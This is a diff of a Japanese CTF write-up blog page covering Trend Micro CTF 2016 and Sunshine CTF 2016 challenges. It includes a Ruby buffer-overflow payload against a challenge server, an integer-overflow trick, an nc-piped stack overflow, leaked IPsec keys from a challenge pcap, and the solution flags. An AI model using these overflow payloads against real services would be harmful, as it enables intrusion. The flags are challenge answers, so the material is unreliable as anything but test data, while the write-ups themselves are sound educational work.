@@ -3,33 +3,28 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Write Ups &middot; urandom</title>
+    <title>Write-ups &middot; urandom</title>
 
     <meta name="description" content="">
 
-    <meta name="generator" content="Hugo 0.40.1" />
+    <meta name="generator" content="Hugo 0.68.3" />
     <meta name="twitter:card" content="summary">
     
-    <meta name="twitter:title" content="Write Ups &middot; urandom">
+    <meta name="twitter:title" content="Write-ups &middot; urandom">
     <meta name="twitter:description" content="">
 
     <meta property="og:type" content="article">
-    <meta property="og:title" content="Write Ups &middot; urandom">
+    <meta property="og:title" content="Write-ups &middot; urandom">
     <meta property="og:description" content="">
 
     <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:400,700|Oxygen:400,700' rel='stylesheet' type='text/css'>
     <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">
-    <!--[if lte IE 8]>
-        <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
-    <![endif]-->
-    <!--[if gt IE 8]><!-->
-        <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
-    <!--<![endif]-->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
 
-    <link rel="stylesheet" href="//blog.urandom.team/css/all.min.css">
+    <link rel="stylesheet" href='//blog.urandom.team/css/all.min.css'>
     <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
 
-    <link rel="alternate" type="application/rss+xml" title="urandom" href="//blog.urandom.team/index.xml" />
+    <link rel="alternate" type="application/rss+xml" title="urandom" href='//blog.urandom.team/index.xml' />
 </head>
 <body>
 
@@ -46,8 +41,12 @@
             <ul class="nav-list">
                 
                 
+                
+                
                 <li class="nav-item">
-                    <a class="pure-button" href="//blog.urandom.team/index.xml"><i class="fa fa-rss"></i> rss</a>
+                    <a class="pure-button" href='//blog.urandom.team/index.xml'>
+                        <i class="fa fa-rss"></i> rss
+                    </a>
                 </li>
             </ul>
         </nav>
@@ -71,152 +70,115 @@
                             
                                 under 
                                 
-                                <a class="post-category post-category-Write-ups" href="//blog.urandom.team/categories/write-ups">Write-ups</a>
+                                    <a class="post-category post-category-Write-ups" href='//blog.urandom.team/categories/Write-ups'>Write-ups</a>
+                                
                             
                         </p>
                     </header>
 
                     <div class="post-description">
-                        
-
-<p>日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われた<a href="http://www.trendmicro.co.jp/jp/sp/ctf2016_jp/">Trend Micro CTF 2016</a>のwrite-upです。</p>
-
+                        <p>日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われた<a href="http://www.trendmicro.co.jp/jp/sp/ctf2016_jp/">Trend Micro CTF 2016</a>のwrite-upです。</p>
 <p>urandomは4問解答し600点、92位でした。</p>
-
 <p>Analysis-Offensive 100をyyu、Analysis-Offensive 200、Misc 100、Misc 200をmaythが解答しました。</p>
-
-<h1 id="analysis-offensive-100">Analysis - Offensive 100</h1>
-
+<h1 id="analysis---offensive-100">Analysis - Offensive 100</h1>
 <blockquote>
 <p>Category: Analysis/Offensive</p>
-
 <p>Points: 100</p>
-
 <p>Please enter key. Key is TMCTF flag.</p>
-
 <p>Download the file
 Decrypt the downloaded file by the following command.</p>
-
 <p><code>openssl enc -d -aes-256-cbc -k x0nSTZ9NrDgvCnqKhL9y -in files1.enc -out files1.zip</code></p>
-
 <p><code>unzip files1.zip</code></p>
 </blockquote>
-
 <p>この問題は巨大なJavaScriptから正解の鍵を得るというものです。
 まず、巨大なJavaScriptのうちの多くの部分は定数をGoogleで調べるなどすると、MD5を実装しているということが分かります。そして、次の3つの文字列もMD5のハッシュ値であろうという推測ができます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ko</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;c33367701511b4f6020ec61ded352059&#34;</span>;
 
-<pre><code class="language-javascript">var ko = &quot;c33367701511b4f6020ec61ded352059&quot;;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ka</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;61636f697b57b5b7d389db0edb801fc3&#34;</span>;
 
-var ka = &quot;61636f697b57b5b7d389db0edb801fc3&quot;;
-
-var kq = &quot;d2172edf24129e06f3913376a12919a4&quot;;
-</code></pre>
-
-<p>これらをまたGoogleで調べると、それぞれ次のような文字列であることが分かります。</p>
-
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">kq</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;d2172edf24129e06f3913376a12919a4&#34;</span>;
+</code></pre></div><p>これらをまたGoogleで調べると、それぞれ次のような文字列であることが分かります。</p>
 <ul>
 <li><code>c33367701511b4f6020ec61ded352059</code> → <code>654321</code></li>
 <li><code>61636f697b57b5b7d389db0edb801fc3</code> → <code>qwerty</code></li>
 <li><code>d2172edf24129e06f3913376a12919a4</code> → <code>admin</code></li>
 </ul>
-
 <p>そして次の処理でこれらの文字列を変数<code>nl</code>に従って並び換えているということが分かります。</p>
-
-<pre><code class="language-javascript">var c = &quot;&quot;, d = &quot;&quot;, e = &quot;&quot;;
-for (var f = 0; f &lt; b.length; ) {
-    c += b[nl[++f]];
-    d += b[nl[++f]];
-    e += b[nl[++f]];
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">f</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">length</span>; ) {
+    <span style="color:#a6e22e">c</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">nl</span>[<span style="color:#f92672">++</span><span style="color:#a6e22e">f</span>]];
+    <span style="color:#a6e22e">d</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">nl</span>[<span style="color:#f92672">++</span><span style="color:#a6e22e">f</span>]];
+    <span style="color:#a6e22e">e</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">nl</span>[<span style="color:#f92672">++</span><span style="color:#a6e22e">f</span>]];
 }
 
-// ......中略......
-
-var nl = [ 0, 2, 1, 12, 7, 15, 5, 4, 8, 16, 17, 3, 9, 10, 14, 11, 13, 6, 0 ];
-</code></pre>
-
-<p>最終的にフラグは<code>TMCTF{q6r4dy5ei2na1twm3}</code>でした。</p>
-
-<h1 id="analysis-offensive-200">Analysis - Offensive 200</h1>
-
+<span style="color:#75715e">// ......中略......
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">nl</span> <span style="color:#f92672">=</span> [ <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0</span> ];
+</code></pre></div><p>最終的にフラグは<code>TMCTF{q6r4dy5ei2na1twm3}</code>でした。</p>
+<h1 id="analysis---offensive-200">Analysis - Offensive 200</h1>
 <blockquote>
 <p>Category: Analysis - offensive</p>
-
 <p>Points: 200</p>
-
 <p>This challenge is composed of a simple remote overflow of a global array. The server address is 52.197.128.90 and the vulnerable application listens on TCP port 80-85. Each port has the same behavior so you can select one of them.</p>
-
 <p>The following code contains a bug that can be exploited to read back a flag:</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> pwned;
+<span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">1024</span>];
 
-<pre><code class="language-c">int pwned;
-char buffer[1024];
+DWORD WINAPI <span style="color:#a6e22e">CallBack</span>(LPVOID lpParameter) {
+	pwned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+	ZeroMemory(buffer, <span style="color:#ae81ff">1024</span>);
+	SOCKET <span style="color:#f92672">*</span>sock <span style="color:#f92672">=</span> (SOCKET <span style="color:#f92672">*</span>)lpParameter;
+	SOCKET _sock <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>sock;
+	send(_sock, <span style="color:#e6db74">&#34;Welcome&#34;</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0</span>);
+	<span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+	ret <span style="color:#f92672">=</span> recv(_sock, buffer, <span style="color:#ae81ff">1028</span>, <span style="color:#ae81ff">0</span>);
+	printf(<span style="color:#e6db74">&#34;[x] RET: %d.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ret);
+	printf(<span style="color:#e6db74">&#34;[x] PWNED: 0x%x.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pwned);
+	Sleep(<span style="color:#ae81ff">1</span>);
+	<span style="color:#66d9ef">if</span> (((pwned <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFFFF</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xc0fe</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x7eaf</span> <span style="color:#f92672">&amp;&amp;</span> (((pwned <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFF</span>)<span style="color:#f92672">^</span><span style="color:#ae81ff">0x1a1a</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xdae4</span>)) {
 
-DWORD WINAPI CallBack(LPVOID lpParameter) {
-	pwned = 0;
-	ZeroMemory(buffer, 1024);
-	SOCKET *sock = (SOCKET *)lpParameter;
-	SOCKET _sock = *sock;
-	send(_sock, &quot;Welcome&quot;, 8, 0);
-	int ret = 0;
-	ret = recv(_sock, buffer, 1028, 0);
-	printf(&quot;[x] RET: %d.\n&quot;, ret);
-	printf(&quot;[x] PWNED: 0x%x.\n&quot;, pwned);
-	Sleep(1);
-	if (((pwned &gt;&gt; 16)&amp;0xFFFF ^ 0xc0fe) == 0x7eaf &amp;&amp; (((pwned &amp; 0xFFFF)^0x1a1a) == 0xdae4)) {
-
-			send(_sock, &quot;PWNED&quot;, 5, 0);
-			ReadAndReturn(L&quot;key.txt&quot;, _sock);
+			send(_sock, <span style="color:#e6db74">&#34;PWNED&#34;</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0</span>);
+			ReadAndReturn(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;key.txt&#34;</span>, _sock);
 			closesocket(_sock);
-			return 0;
+			<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 	}
-	else {
-		send(_sock, &quot;GO AWAY&quot;, 7, 0);
+	<span style="color:#66d9ef">else</span> {
+		send(_sock, <span style="color:#e6db74">&#34;GO AWAY&#34;</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0</span>);
 		closesocket(_sock);
 	}
 
-	return 0;
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
  }
-</code></pre>
-
+</code></pre></div><blockquote>
 <p>Craft a packet that would return a valid flag. Good luck!</p>
 </blockquote>
-
 <p><code>buffer</code>が1024バイトしか確保されていないにもかかわらず、11行目で <code>ret = recv(_sock, buffer, 1028, 0);</code> と1028バイト読み込むようになっている。したがって、1025-1028バイトの範囲に特定のバイト列を仕込めばよい。満たすべき条件は15行目のif文。</p>
-
 <p>なぜか <code>nc</code> が1024バイトで送信を打ち切ってしまったので、Rubyで書いた。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;socket&#39;</span>
 
-<pre><code class="language-ruby">require 'socket'
+<span style="color:#66d9ef">HOST</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;52.197.128.90&#39;</span>
+port <span style="color:#f92672">=</span> (<span style="color:#ae81ff">80</span><span style="color:#f92672">..</span><span style="color:#ae81ff">85</span>)<span style="color:#f92672">.</span>to_a<span style="color:#f92672">.</span>sample
 
-HOST = '52.197.128.90'
-port = (80..85).to_a.sample
+puts <span style="color:#e6db74">&#34;connecting </span><span style="color:#e6db74">#{</span><span style="color:#66d9ef">HOST</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">#{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+sock <span style="color:#f92672">=</span> <span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;52.197.128.90&#39;</span>, port)
 
-puts &quot;connecting #{HOST}:#{port}&quot;
-sock = TCPSocket.open('52.197.128.90', port)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\xc0\x51\xbe</span><span style="color:#e6db74">&#34;</span>
 
-payload = 'a' * 1024 + &quot;\xfe\xc0\x51\xbe&quot;
-
-sock.read(8)
-sock.send(payload, 0)
-while r = sock.gets
+sock<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">8</span>)
+sock<span style="color:#f92672">.</span>send(payload, <span style="color:#ae81ff">0</span>)
+<span style="color:#66d9ef">while</span> r <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>gets
   puts r
-end
-</code></pre>
-
-<p>そして正解をメモし忘れた 😇</p>
-
+<span style="color:#66d9ef">end</span>
+</code></pre></div><p>そして正解をメモし忘れた 😇</p>
 <h1 id="misc-100">Misc 100</h1>
-
 <blockquote>
 <p>Category: Misc(iot and network)</p>
-
 <p>Points: 100</p>
-
 <p>Please analyze this pcap.</p>
 </blockquote>
-
 <p>pcapファイルが渡される。中身を見ると、IPsecな通信と、普通にtelnetしている通信がある。</p>
-
 <p>Wiresharkでtelnetでのやりとりをテキストとして見ると、 <code>ip xfrm state</code>を叩いている箇所がある。</p>
-
 <pre><code>.]0;reds@localhost:~.[reds@localhost ~]$ sudo ip xfrm state
 .sudo ip xfrm state
 [sudo] password for reds: ynwa
@@ -241,30 +203,18 @@ src 1.1.1.11 dst 1.1.1.10
 	replay-window 32 flag 20
 	auth hmac(sha1) 0x100a0b23fc006c867455506843cc96ad26026ec0
 	enc cbc(aes) 0xdcfbc7d33d3c606de488c6efac4624ed50b550c88be0d62befb049992972cca6
-</code></pre>
-
-<p>この情報を元に、IPsecの通信の中身を見ることができる。すると、HTTPでいくつかやりとりをしている箇所が見つかる。その中に <code>flag.png</code> というファイルのダウンロードが含まれている。これを抽出して開くと、フラグが書かれている。</p>
-
+</code></pre><p>この情報を元に、IPsecの通信の中身を見ることができる。すると、HTTPでいくつかやりとりをしている箇所が見つかる。その中に <code>flag.png</code> というファイルのダウンロードが含まれている。これを抽出して開くと、フラグが書かれている。</p>
 <h1 id="misc-200">Misc 200</h1>
-
 <blockquote>
 <p>Category: Misc(iot and network)</p>
-
 <p>Points: 200</p>
-
 <p>find all LTE bands this phone supported.</p>
-
 <p>the final answer will be from small to big, and use &lsquo;,&rsquo; to seperate without spaces.</p>
-
 <p>example&gt; if the answer is band 1 and 2 and 3, the key should be: &ldquo;TMCTF{1,2,3}&rdquo;</p>
 </blockquote>
-
 <p><code>ModemSettings.txt</code> というファイルが与えられ、そこからその携帯電話の対応しているLTEバンドを答える。</p>
-
 <p>この <code>ModemSettings.txt</code> はどうやら NV-items_reader_writerというソフトウェアによる出力らしい。</p>
-
-<p>LTEのバンドに関する設定は&rdquo;6828&rdquo;番にあるという。該当する箇所を引用する。</p>
-
+<p>LTEのバンドに関する設定は&quot;6828&quot;番にあるという。該当する箇所を引用する。</p>
 <pre><code>6828 (0x1AAC)   -   OK
 FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
@@ -274,15 +224,10 @@ FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-</code></pre>
-
-<p>ここに書き込まれている数値が対応LTEバンドを表している。ビット単位で読んで、あるビットが立っていたら、そのビットと対応するバンドをサポートしていることを意味している。最右ビットがバンド1に対応する。</p>
-
+</code></pre><p>ここに書き込まれている数値が対応LTEバンドを表している。ビット単位で読んで、あるビットが立っていたら、そのビットと対応するバンドをサポートしていることを意味している。最右ビットがバンド1に対応する。</p>
 <p>寝起きでつらいワンライナーを書いておしまい。エンディアンに注意。</p>
-
-<pre><code class="language-ruby">i=0; puts (0x031F1DFF).to_s(2).reverse.split(//).map { |c| i +=1; [c, i] }.select { |x| x[0] == '1' }.map { |x| x[1] }.join(',')
-</code></pre>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; puts (<span style="color:#ae81ff">0x031F1DFF</span>)<span style="color:#f92672">.</span>to_s(<span style="color:#ae81ff">2</span>)<span style="color:#f92672">.</span>reverse<span style="color:#f92672">.</span>split(<span style="color:#e6db74">//</span>)<span style="color:#f92672">.</span>map { <span style="color:#f92672">|</span>c<span style="color:#f92672">|</span> i <span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>; <span style="color:#f92672">[</span>c, i<span style="color:#f92672">]</span> }<span style="color:#f92672">.</span>select { <span style="color:#f92672">|</span>x<span style="color:#f92672">|</span> x<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span> }<span style="color:#f92672">.</span>map { <span style="color:#f92672">|</span>x<span style="color:#f92672">|</span> x<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">]</span> }<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;,&#39;</span>)
+</code></pre></div>
                     </div>
                 </section>
                 
@@ -299,66 +244,46 @@ FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
                             
                                 under 
                                 
-                                <a class="post-category post-category-Write-ups" href="//blog.urandom.team/categories/write-ups">Write-ups</a>
+                                    <a class="post-category post-category-Write-ups" href='//blog.urandom.team/categories/Write-ups'>Write-ups</a>
+                                
                             
                         </p>
                     </header>
 
                     <div class="post-description">
-                        
-
-<p>2016-03-13 01:00 - 2016-03-14 05:00 (JST)に開催された<a href="http://ctf.bsidesorlando.org/">Sunshine CTF 2016</a>のwrite-upです。</p>
-
+                        <p>2016-03-13 01:00 - 2016-03-14 05:00 (JST)に開催された<a href="http://ctf.bsidesorlando.org/">Sunshine CTF 2016</a>のwrite-upです。</p>
 <p>なお、今回は以下のメンバー編成で参加しました。</p>
-
 <ul>
 <li>mayth （土曜日を寝て潰す担当）</li>
 <li>op （たまに現れていくらかの助言と違法語句を残して去って行く担当）</li>
 </ul>
-
 <p>ESTはクソ。</p>
-
 <h1 id="forensics-50-butterfly-effect">Forensics 50: Butterfly Effect</h1>
-
 <p><code>butterfly.png</code>が与えられる。</p>
-
-<p><a href="http://www1.chapman.edu/~nabav100/ImgStegano/">ImgStegano</a>にファイルを読み込ませて&rdquo;Image &gt; Enhanced LSB&rdquo;とするとフラグが現れた。</p>
-
+<p><a href="http://www1.chapman.edu/~nabav100/ImgStegano/">ImgStegano</a>にファイルを読み込ませて&quot;Image &gt; Enhanced LSB&quot;とするとフラグが現れた。</p>
 <blockquote>
 <p>sun{RE4DY_THE_4CID_M4GNET!}</p>
 </blockquote>
-
 <h1 id="exploitation-50-alligatorsim95">Exploitation 50: alligatorsim95</h1>
-
 <blockquote>
 <p>Don&rsquo;t try to automate adding X eggs at a time</p>
-
 <p>legends circulate in florida of an alligator that had laid millions of eggs. use this simulator to try to achieve the same greatness</p>
 </blockquote>
-
 <p>※プログラムは与えられない。</p>
-
 <p>指定されたIPアドレス/ポートにncで接続すると、アリゲーターのAAと共に文章が流れてくる。</p>
-
 <pre><code>-&gt; u r... AN ALLIGATOR!!
 .. simulating alligator lifecycle ..
 .. simulating alligator throwing physics..
 -&gt; you got 1337 eggz in ur nest, how many you gonna lay alligator??
-</code></pre>
-
-<p>この後に整数値を入力すると、その数だけ卵の数（上記の通り初期値1337）が増える。ただし上限は50。それを超えると拒否され再度同様のプロンプトが現れる。接続を切られるのは以下の通り。</p>
-
+</code></pre><p>この後に整数値を入力すると、その数だけ卵の数（上記の通り初期値1337）が増える。ただし上限は50。それを超えると拒否され再度同様のプロンプトが現れる。接続を切られるのは以下の通り。</p>
 <ul>
 <li><code>echo</code>とかで入力を機械的に流し込もうとしたとき (&ldquo;Don&rsquo;t try to automate adding X eggs at a time&rdquo;)</li>
 <li>0や数字として解釈出来ない数を与えたとき</li>
 <li>一定時間が経過したとき</li>
 </ul>
-
 <p>この条件下で卵の数を大きくする問題。</p>
-
 <p>色々入力を試すと、0はダメだが負数を受け付けること、また、負数であれば絶対値がいくら大きくてもよいことがわかった。
 これを利用すると整数オーバーフローを引き起こすことができる。そうすると卵の数は非常に大きな値となり、フラグを得ることができる。</p>
-
 <pre><code>-&gt; u r... AN ALLIGATOR!!
 .. simulating alligator lifecycle ..
 .. simulating alligator throwing physics..
@@ -375,44 +300,28 @@ FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
 -&gt; dang 2147444976 is a lotta eggs
 -&gt; as a god among gators here is ur crown:
 sun{int_0verflow_i5_a_g0od_st4rt}
-</code></pre>
-
-<blockquote>
+</code></pre><blockquote>
 <p>sun{int_0verflow_i5_a_g0od_st4rt}</p>
 </blockquote>
-
 <h1 id="exploitation-55-dance">Exploitation 55: Dance</h1>
-
 <blockquote>
 <p>Some prefer the stanky leg, others prefer the dab, but what dance moves do you have?</p>
 </blockquote>
-
 <p>IPアドレスとポート番号が指定される。当初プログラムは与えられなかったが、後にフラグ部分を潰したバイナリが配布された。</p>
-
 <p>サーバーに接続すると以下のような文字が流れてくる。</p>
-
 <pre><code>welcome to the pro club. you just paid a door fee and have no respect. earn ur cred on the dancefloor!
 give us ur sick dance moves like so:
 whip,naenae,whip,whip,naenae&lt;ENTER&gt;
-</code></pre>
-
-<p><code>whip</code>か<code>naenae</code>をカンマ区切りで並べて送信すると</p>
-
+</code></pre><p><code>whip</code>か<code>naenae</code>をカンマ区切りで並べて送信すると</p>
 <pre><code>do the naenae
 (\)
   \(:O)
    /||\_
 _/¯    ¯\_
-</code></pre>
-
-<p>こんな感じで対応したアクションと愉快なAAが流れてくる。</p>
-
+</code></pre><p>こんな感じで対応したアクションと愉快なAAが流れてくる。</p>
 <p>当初何をさせたいのかさっぱりわからなかったが、バイナリが配布されたのでそれを読んだ。</p>
-
 <p>その結果、こちらからの入力を受け取るバッファについて、<code>memset</code>で80bytesを<code>NULL</code>で初期化しているにも関わらず、<code>fgets</code>で最大89bytesまで読み込むようになっていることがわかった。また、0で初期化された特定の変数の値が書き換わっているときにフラグが表示されるようになっていることがわかった。</p>
-
 <p>入力の読み込みはだいたい次のようなロジックになっている。</p>
-
 <pre><code>while (strlen(buf) &gt; 0) {
   if (*buf == 'n') {
     buf += 7;
@@ -423,10 +332,7 @@ _/¯    ¯\_
   }
 }
 check_flag();
-</code></pre>
-
-<p>先頭しか見てないっぽいので適当に80文字の&rdquo;n&rdquo;を送り付けたところ、フラグが得られた。</p>
-
+</code></pre><p>先頭しか見てないっぽいので適当に80文字の&quot;n&quot;を送り付けたところ、フラグが得られた。</p>
 <pre><code>% ruby -e 'puts &quot;n&quot; * 0x50' | nc ****
 welcome to the pro club. you just paid a door fee and have no respect. earn ur cred on the dancefloor!
 give us ur sick dance moves like so:
@@ -445,45 +351,30 @@ _/¯    ¯\_
 girl u can dance w the best of em. the pw to our vip lounge is: sun{d4nc3_0n_th3_s7ack}
 
 cool dance! come again!
-</code></pre>
-
-<blockquote>
+</code></pre><blockquote>
 <p>sun{d4nc3_0n_th3_s7ack}</p>
 </blockquote>
-
 <h1 id="misc-50-find-floridaman">Misc 50: Find Floridaman</h1>
-
 <blockquote>
 <p>In other news&hellip; Floridaman did what with an alligator?</p>
-
 <p>Remember, this has the normal flag format.</p>
-
 <p>Hint: You need only look at comments from Florida-based news websites.</p>
-
 <p>Hint: Gator went threw a window!</p>
-
 <p>Hint: &ldquo;Flori-duh&rdquo;</p>
-
 <p>NOTE: Flag was posted before the 12th</p>
 </blockquote>
-
 <p>フロリダマンを探すマン。</p>
-
 <p>問題オープン当初は最初の2文だけだったのが、誰も解かないからか次々にヒントが追加されて結局ヒントが3つになった。</p>
-
-<p>ヒントが3つになってから、そのヒントを元に&rdquo;Flori-duh Alligator&rdquo;で探してみると、次の記事が見つかった。</p>
-
+<p>ヒントが3つになってから、そのヒントを元に&quot;Flori-duh Alligator&quot;で探してみると、次の記事が見つかった。</p>
 <p><a href="http://www.mypalmbeachpost.com/news/news/crime-law/wendys-alligator-thrower-is-only-fulfilling-his-fl/nqNfr/">Wendy’s alligator-thrower is only fulfilling his Flori-duh destiny</a></p>
-
 <p>この記事のReader Commentsにフラグがある。</p>
-
 <blockquote>
 <p>Summerc137 3 days ago
 May the Lord have mercy on this man. That poor woman in the drivethrough! sun{1s_th1s_even_real_l1fe?}</p>
-
+</blockquote>
+<blockquote>
 <p>sun{1s_th1s_even_real_l1fe?}</p>
 </blockquote>
-
 <p>ちなみにこの事件、なんでも1mちょっとあるアリゲーターをWendy&rsquo;sのドライブスルーの窓から投げ込んだのだそうな。さすがアメリカ。</p>
 
                     </div>
@@ -495,11 +386,12 @@ May the Lord have mercy on this man. That poor woman in the drivethrough! sun{1s
             <div class="footer">
     <div class="pure-menu pure-menu-horizontal pure-menu-open">
         <ul>
-            <li>Powered by <a class="hugo" href="http://hugo.spf13.com/" target="_blank">hugo</a></li>
+            <li>Powered by <a class="hugo" href="https://gohugo.io/" target="_blank">hugo</a></li>
         </ul>
     </div>
 </div>
-<script src="//blog.urandom.team/js/all.min.js"></script>
+<script src='//blog.urandom.team/js/all.min.js'></script>
+
         </div>
     </div>
 </div>
